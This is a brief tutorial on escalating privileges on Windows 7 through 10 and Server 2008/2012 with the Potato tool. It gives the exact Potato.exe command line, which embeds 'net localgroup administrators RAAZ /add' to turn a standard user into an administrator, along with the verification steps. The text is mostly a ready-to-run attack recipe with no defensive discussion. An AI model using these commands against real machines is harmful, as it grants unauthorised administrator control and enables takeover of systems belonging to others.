Privilege Escalation on Windows 7,8,10, Server 2008, Server 2012 using Potato

First check your IP Address of your local PC using ipconfig command

Now open command prompt, type net localgroup administrators command to check who all users are associated with administrator.
In my case I’m login with RAAZ user which is not a part of administrator

Now download Potato.exe from here and go to the Potato folder from command prompt and type
Potato.exe –ip 192.168.1.9 –disable_exhaust true –cmd “C:\\windows\\System32\\cmd.exe /K net localgroup administrators RAAZ /add”

Now it will open a firewall prompt, click on Allow access

Now again type net localgroup administrators, here you can see my user RAAZ is also a member of administrator.
